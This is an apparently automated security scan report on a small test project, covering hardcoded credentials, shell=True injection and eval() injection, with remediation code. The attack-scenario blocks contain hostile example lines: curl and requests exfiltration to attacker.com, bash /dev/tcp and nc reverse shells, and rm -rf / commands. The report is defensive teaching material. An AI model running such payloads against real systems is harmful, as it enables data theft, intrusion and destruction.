# AgentSec Security Scan Report
**Scan Date:** 2026-02-13  
**Target:** /mnt/c/code/AgentSec/test-scan  
**Scanner:** AgentSec (Bandit + Graudit)

---

## Executive Summary

**CRITICAL FINDINGS:** 3 high-severity vulnerabilities detected

| Severity | Count | Status |
|----------|-------|--------|
| 🔴 **CRITICAL** | 1 | ⚠️ Requires immediate action |
| 🟠 **HIGH** | 1 | ⚠️ Fix before deployment |
| 🟡 **MEDIUM** | 1 | ⚠️ Address soon |
| 🔵 **LOW** | 1 | ℹ️ Review recommended |

**Files Scanned:** 2 Python files (29 lines of code)  
**Vulnerable Files:** 1 (`vulnerable_app.py`)  
**Clean Files:** 1 (`utils.py`)

---

## Detailed Findings

### 🔴 CRITICAL: Hardcoded Credentials Exposed
**File:** `vulnerable_app.py:9-10`  
**Test ID:** Manual Detection (Graudit `secrets` database)  
**CWE:** [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)  
**MITRE ATT&CK:** T1552.001 - Credentials in Files

**Vulnerable Code:**
```python
api_key = "sk-1234567890abcdef"
password = "admin123"
```

**Risk Assessment:**
Hardcoded credentials are embedded directly in source code. If this code is committed to version control, shared, or leaked, attackers gain immediate access with these credentials.

**Attack Scenarios:**
- API key allows unauthorized access to external services
- Password can be used for system compromise
- Credentials persist in Git history even after removal

**Remediation:**
```python
# ✅ SECURE: Use environment variables
import os

api_key = os.environ.get("API_KEY")
password = os.environ.get("PASSWORD")

# Validate credentials exist
if not api_key or not password:
    raise ValueError("Missing required environment variables")
```

**References:**
- [OWASP - Use of Hard-coded Credentials](https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_credentials)
- [NIST SP 800-53 IA-5(7)](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r5.pdf)

---

### 🟠 HIGH: Shell Injection via subprocess
**File:** `vulnerable_app.py:21`  
**Test ID:** B602 (Bandit)  
**Severity:** HIGH | **Confidence:** HIGH  
**CWE:** [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)  
**MITRE ATT&CK:** T1059.004 - Unix Shell Execution

**Vulnerable Code:**
```python
def run_shell_command(cmd):
    """Run a shell command"""
    output = subprocess.check_output(cmd, shell=True)
    return output
```

**Risk Assessment:**
Using `shell=True` allows command injection if `cmd` contains user input. Attackers can chain commands using `;`, `&&`, `||`, or command substitution.

**Attack Scenarios:**
```python
# Scenario 1: Data exfiltration
run_shell_command("ls; curl http://attacker.com/?data=$(cat /etc/passwd)")

# Scenario 2: Reverse shell
run_shell_command("whoami; bash -i >& /dev/tcp/attacker.com/4444 0>&1")

# Scenario 3: System destruction
run_shell_command("ls && rm -rf / --no-preserve-root")
```

**Remediation:**
```python
# ✅ SECURE: Use shell=False with argument list
import subprocess
import shlex

def run_shell_command(cmd):
    """Run a shell command safely"""
    # Option 1: Pass command as list (preferred)
    if isinstance(cmd, str):
        cmd_list = shlex.split(cmd)  # Safely parse command
    else:
        cmd_list = cmd
    
    output = subprocess.check_output(cmd_list, shell=False)
    return output

# ✅ SECURE: Validate and restrict commands
ALLOWED_COMMANDS = {'ls', 'whoami', 'date'}

def run_shell_command_restricted(cmd):
    """Only allow specific whitelisted commands"""
    cmd_parts = shlex.split(cmd)
    if cmd_parts[0] not in ALLOWED_COMMANDS:
        raise ValueError(f"Command not allowed: {cmd_parts[0]}")
    
    output = subprocess.check_output(cmd_parts, shell=False)
    return output
```

**References:**
- [Bandit B602 Documentation](https://bandit.readthedocs.io/en/latest/plugins/b602_subprocess_popen_with_shell_equals_true.html)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

---

### 🟡 MEDIUM: Arbitrary Code Execution via eval()
**File:** `vulnerable_app.py:15`  
**Test ID:** B307 (Bandit)  
**Severity:** MEDIUM | **Confidence:** HIGH  
**CWE:** [CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code](https://cwe.mitre.org/data/definitions/95.html)  
**MITRE ATT&CK:** T1059 - Command and Scripting Interpreter

**Vulnerable Code:**
```python
def execute_user_command(user_input):
    """Execute user input - DANGEROUS!"""
    result = eval(user_input)
    return result
```

**Risk Assessment:**
The `eval()` function executes arbitrary Python expressions. Attackers can execute any Python code, including importing modules, running system commands, and exfiltrating data.

**Attack Scenarios:**
```python
# Scenario 1: File system access
execute_user_command("open('/etc/passwd').read()")

# Scenario 2: System command execution
execute_user_command("__import__('os').system('rm -rf /')")

# Scenario 3: Remote code execution
execute_user_command("__import__('subprocess').Popen(['nc', '-e', '/bin/sh', 'attacker.com', '4444'])")

# Scenario 4: Module import and exploitation
execute_user_command("__import__('requests').post('http://attacker.com', data=locals())")
```

**Remediation:**
```python
# ✅ SECURE OPTION 1: Use ast.literal_eval for safe evaluation
import ast

def execute_user_command(user_input):
    """Safely evaluate literal expressions only"""
    try:
        # Only evaluates: strings, numbers, tuples, lists, dicts, booleans, None
        result = ast.literal_eval(user_input)
        return result
    except (ValueError, SyntaxError):
        raise ValueError("Invalid input - only literals allowed")

# ✅ SECURE OPTION 2: Use allowlist validation
ALLOWED_OPERATIONS = {
    'add': lambda a, b: a + b,
    'multiply': lambda a, b: a * b,
    'subtract': lambda a, b: a - b,
}

def execute_user_command(operation: str, a: int, b: int) -> int:
    """Command dispatcher with type safety"""
    if operation not in ALLOWED_OPERATIONS:
        raise ValueError(f"Operation not allowed: {operation}")
    return ALLOWED_OPERATIONS[operation](a, b)

# ✅ SECURE OPTION 3: Remove eval entirely
# Replace with specific functions for each use case
def handle_user_input(command_type: str, args: List[str]) -> Any:
    """Command dispatcher - no eval needed"""
    if command_type == "add":
        return int(args[0]) + int(args[1])
    elif command_type == "multiply":
        return int(args[0]) * int(args[1])
    else:
        raise ValueError("Unknown command")
```

**References:**
- [Bandit B307 Documentation](https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b307-eval)
- [Python ast.literal_eval Documentation](https://docs.python.org/3/library/ast.html#ast.literal_eval)

---

### 🔵 LOW: Subprocess Module Import
**File:** `vulnerable_app.py:5`  
**Test ID:** B404 (Bandit)  
**Severity:** LOW | **Confidence:** HIGH

**Finding:**
```python
import subprocess
```

**Risk Assessment:**
The subprocess module itself is not dangerous, but its presence indicates potential command execution. This is informational only.

**Action Required:**
No immediate action needed. Ensure all subprocess usage follows secure patterns (see HIGH severity finding above).

---

## OWASP Top 10 2021 Mapping

| OWASP Category | Vulnerabilities Found | Severity |
|----------------|----------------------|----------|
| **A03:2021 – Injection** | `eval()`, `subprocess(shell=True)` | 🔴 CRITICAL |
| **A07:2021 – Identification and Authentication Failures** | Hardcoded credentials | 🔴 CRITICAL |

---

## MITRE ATT&CK Framework Mapping

| Tactic | Technique | Finding |
|--------|-----------|---------|
| **Initial Access** | T1190 - Exploit Public-Facing Application | eval(), shell injection |
| **Execution** | T1059 - Command and Scripting Interpreter | eval(), subprocess |
| **Execution** | T1059.004 - Unix Shell | subprocess(shell=True) |
| **Credential Access** | T1552.001 - Credentials in Files | Hardcoded API key and password |

---

## Remediation Priority

### 🚨 Phase 1: Immediate (< 24 hours)
1. **CRITICAL** - Remove hardcoded credentials from `vulnerable_app.py:9-10`
   - Rotate API key `sk-1234567890abcdef`
   - Change password `admin123`
   - Implement environment variables or secrets manager
   - Check Git history and purge exposed secrets

2. **HIGH** - Fix shell injection in `run_shell_command()` (line 21)
   - Refactor to use `shell=False`
   - Implement command allowlist
   - Add input validation

### ⚠️ Phase 2: Urgent (< 1 week)
3. **MEDIUM** - Replace `eval()` with safe alternatives (line 15)
   - Use `ast.literal_eval()` if literal evaluation needed
   - Implement command dispatcher pattern
   - Remove eval entirely if possible

### ℹ️ Phase 3: Monitoring
4. **LOW** - Review all subprocess usage
   - Audit all subprocess calls
   - Document security review

---

## Security Checklist

### Immediate Actions
- [ ] Rotate exposed API key: `sk-1234567890abcdef`
- [ ] Change exposed password: `admin123`
- [ ] Remove hardcoded credentials from `vulnerable_app.py`
- [ ] Configure environment variables for secrets
- [ ] Purge credentials from Git history using `git filter-repo`

### Code Remediation
- [ ] Refactor `run_shell_command()` to use `shell=False`
- [ ] Replace `eval()` with `ast.literal_eval()` or remove entirely
- [ ] Add input validation for all user-controlled data
- [ ] Implement command allowlisting

### Validation
- [ ] Re-run security scan: `bandit -r . -ll`
- [ ] All subprocess calls use `shell=False`
- [ ] No `eval()` or `exec()` functions in production code
- [ ] Environment variables configured for credentials
- [ ] Security testing passed

---

## Testing & Validation

### Security Test Suite
```bash
# 1. Re-run Bandit scan
bandit -r /mnt/c/code/AgentSec/test-scan -ll

# 2. Check for hardcoded secrets
graudit -d secrets /mnt/c/code/AgentSec/test-scan

# 3. Verify command execution safety
graudit -d exec /mnt/c/code/AgentSec/test-scan

# 4. Run Python security tests
python -m pytest tests/security/ -v
```

---

## Clean Files

The following files passed security scanning with no vulnerabilities:

- ✅ `utils.py` (9 lines) - No security issues detected

---

## Scanner Configuration

**Tools Used:**
- **Bandit** v1.7.x - Python AST security analysis
- **Graudit** v4.0 - Pattern-based security audit
  - Databases: `secrets`, `exec`

**Command History:**
```bash
bandit -r . -f json --exclude "*.md"
graudit -d secrets .
graudit -d exec .
```

---

## Next Steps

1. ✅ **Review** this report with the development team
2. ⏳ **Prioritize** remediation based on severity (CRITICAL → HIGH → MEDIUM → LOW)
3. ⏳ **Implement** fixes according to remediation guidance
4. ⏳ **Test** all changes in development environment
5. ⏳ **Re-scan** after fixes to verify resolution
6. ⏳ **Document** security improvements in release notes

---

## Additional Recommendations

### Secure Development Practices
1. **Pre-commit hooks**: Install Bandit as pre-commit hook to catch issues early
2. **CI/CD integration**: Add security scanning to deployment pipeline
3. **Code review**: Require security review for sensitive code changes
4. **Developer training**: Educate team on secure coding practices

### Infrastructure Security
1. **Secrets management**: Migrate to AWS Secrets Manager, HashiCorp Vault, or Azure Key Vault
2. **Environment isolation**: Use separate credentials for dev/staging/production
3. **Access control**: Implement least-privilege access for credentials
4. **Monitoring**: Log and alert on credential usage

---

**Report Generated By:** AgentSec Security Scanner  
**Scan Duration:** < 5 seconds  
**Total Issues:** 4 (1 CRITICAL, 1 HIGH, 1 MEDIUM, 1 LOW)

---

## Appendix: Full Scan Results

### Bandit JSON Output Summary
```json
{
  "metrics": {
    "_totals": {
      "loc": 29,
      "nosec": 0,
      "SEVERITY.HIGH": 1.0,
      "SEVERITY.MEDIUM": 1.0,
      "SEVERITY.LOW": 1.0
    }
  },
  "results_count": 3
}
```

### Files Analyzed
1. `./vulnerable_app.py` (20 lines) - **3 findings**
2. `./utils.py` (9 lines) - **0 findings**

**End of Report**
